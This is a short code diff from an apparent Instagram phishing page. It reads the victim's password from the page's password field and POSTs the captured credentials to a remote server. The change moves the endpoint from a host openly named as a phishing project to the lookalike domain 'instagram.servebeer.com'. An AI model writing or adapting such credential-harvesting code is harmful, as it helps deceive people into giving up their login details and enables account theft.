@@ -45,7 +45,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const password = document.getElementById('password').value;
 
     try {
-        const response = await fetch('https://instagram-phishing-project.onrender.com/login', {
+        const response = await fetch('https://instagram.servebeer.com/login', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
